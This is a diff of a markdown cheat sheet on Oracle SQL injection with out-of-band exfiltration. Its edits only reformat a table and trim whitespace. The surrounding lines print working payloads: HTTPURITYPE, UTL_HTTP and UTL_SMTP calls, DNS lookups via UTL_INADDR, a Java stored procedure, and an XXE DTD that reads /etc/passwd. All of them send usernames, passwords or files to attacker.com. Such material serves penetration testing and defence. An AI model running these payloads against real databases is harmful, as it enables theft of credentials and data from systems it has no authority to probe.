@@ -15,14 +15,14 @@ Out-of-Band (OOB) techniques provide a powerful method for data extraction when 
 
 Oracle provides several packages that can be used for OOB data exfiltration:
 
-| Package | Function | Description | Protocol | Privileges Required |
-|---------|----------|-------------|----------|---------------------|
-| `UTL_HTTP` | `REQUEST` | Makes HTTP requests | HTTP(S) | EXECUTE on UTL_HTTP |
-| `UTL_TCP` | `OPEN_CONNECTION` | Opens TCP connection | TCP | EXECUTE on UTL_TCP |
-| `UTL_SMTP` | `SEND_MAIL` | Sends email | SMTP | EXECUTE on UTL_SMTP |
-| `UTL_INADDR` | `GET_HOST_ADDRESS` | Resolves DNS | DNS | EXECUTE on UTL_INADDR |
-| `DBMS_LDAP` | `INIT` | Connects to LDAP | LDAP | EXECUTE on DBMS_LDAP |
-| `HTTPURITYPE` | `GETCLOB` | Fetches HTTP content | HTTP(S) | Basic privileges |
+| Package       | Function           | Description          | Protocol | Privileges Required   |
+| ------------- | ------------------ | -------------------- | -------- | --------------------- |
+| `UTL_HTTP`    | `REQUEST`          | Makes HTTP requests  | HTTP(S)  | EXECUTE on UTL_HTTP   |
+| `UTL_TCP`     | `OPEN_CONNECTION`  | Opens TCP connection | TCP      | EXECUTE on UTL_TCP    |
+| `UTL_SMTP`    | `SEND_MAIL`        | Sends email          | SMTP     | EXECUTE on UTL_SMTP   |
+| `UTL_INADDR`  | `GET_HOST_ADDRESS` | Resolves DNS         | DNS      | EXECUTE on UTL_INADDR |
+| `DBMS_LDAP`   | `INIT`             | Connects to LDAP     | LDAP     | EXECUTE on DBMS_LDAP  |
+| `HTTPURITYPE` | `GETCLOB`          | Fetches HTTP content | HTTP(S)  | Basic privileges      |
 
 ### DNS-Based Data Exfiltration
 
@@ -67,8 +67,8 @@ HTTP requests can send data directly to an attacker-controlled server:
 ' UNION SELECT HTTPURITYPE('http://attacker.com/data?user='||(SELECT username FROM users WHERE rownum=1)).GETCLOB() FROM dual--
 
 -- Using UTL_HTTP with POST
-' BEGIN 
-    UTL_HTTP.SET_HEADER(req => UTL_HTTP.BEGIN_REQUEST('http://attacker.com/collect', 'POST'), 
+' BEGIN
+    UTL_HTTP.SET_HEADER(req => UTL_HTTP.BEGIN_REQUEST('http://attacker.com/collect', 'POST'),
                         name => 'Content-Type',
                         value => 'application/x-www-form-urlencoded');
     UTL_HTTP.SET_HEADER(req => r, name => 'Content-Length',
@@ -92,8 +92,8 @@ Using UTL_SMTP to send data via email:
       UTL_SMTP.HELO(c, 'victim.com');
       UTL_SMTP.MAIL(c, 'oracle@victim.com');
       UTL_SMTP.RCPT(c, 'collector@attacker.com');
-      UTL_SMTP.DATA(c, 'From: oracle@victim.com' || CHR(13) || CHR(10) || 
-                       'To: collector@attacker.com' || CHR(13) || CHR(10) || 
+      UTL_SMTP.DATA(c, 'From: oracle@victim.com' || CHR(13) || CHR(10) ||
+                       'To: collector@attacker.com' || CHR(13) || CHR(10) ||
                        'Subject: Oracle Data' || CHR(13) || CHR(10) || CHR(13) || CHR(10) ||
                        'Data: ' || (SELECT username||':'||password FROM users WHERE rownum=1) || CHR(13) || CHR(10) || CHR(13) || CHR(10) || '.');
       UTL_SMTP.QUIT(c);
@@ -137,6 +137,7 @@ Using XXE to exfiltrate data:
 ```
 
 Where evil.dtd on attacker.com contains:
+
 ```xml
 <!ENTITY % data SYSTEM "file:///etc/passwd">
 <!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%data;'>">
@@ -162,7 +163,7 @@ If Java is enabled:
       }';
     EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION http_send(url IN VARCHAR2) RETURN VARCHAR2 AS
       LANGUAGE JAVA NAME ''HttpSender.sendData(java.lang.String) return java.lang.String'';';
-    EXECUTE http_send('http://attacker.com/collect?data=' || 
+    EXECUTE http_send('http://attacker.com/collect?data=' ||
                      (SELECT username||':'||password FROM users WHERE rownum=1));
   END;--
 ```
@@ -174,8 +175,8 @@ For extracting large datasets:
 ```sql
 -- Using LISTAGG to consolidate data
 ' BEGIN
-    UTL_HTTP.REQUEST('http://attacker.com/data?users=' || 
-                     (SELECT LISTAGG(username||':'||password, ',') WITHIN GROUP (ORDER BY username) 
+    UTL_HTTP.REQUEST('http://attacker.com/data?users=' ||
+                     (SELECT LISTAGG(username||':'||password, ',') WITHIN GROUP (ORDER BY username)
                       FROM users WHERE rownum <= 10));
   END;--
 
@@ -215,4 +216,3 @@ For extracting large datasets:
 -- Hexadecimal encoding
 ' AND UTL_INADDR.GET_HOST_ADDRESS(SUBSTR(RAWTOHEX((SELECT username FROM users WHERE rownum=1)),1,8)||'.attacker.com')--
 ```
-
